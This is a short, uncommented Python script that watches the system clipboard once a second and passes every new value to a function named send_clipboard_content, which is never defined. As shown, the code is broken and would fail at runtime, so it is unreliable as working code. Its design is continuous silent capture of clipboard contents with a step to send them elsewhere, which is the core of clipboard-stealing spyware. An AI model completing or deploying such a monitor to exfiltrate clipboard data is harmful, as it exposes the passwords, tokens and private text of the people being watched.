import pyperclip
import time

previous_clipboard = ""

def monitor_clipboard():
    global previous_clipboard
    while True:
        current_clipboard = pyperclip.paste()
        if current_clipboard != previous_clipboard:
            previous_clipboard = current_clipboard
            send_clipboard_content()
        time.sleep(1)

if __name__ == "__main__":
    monitor_clipboard()
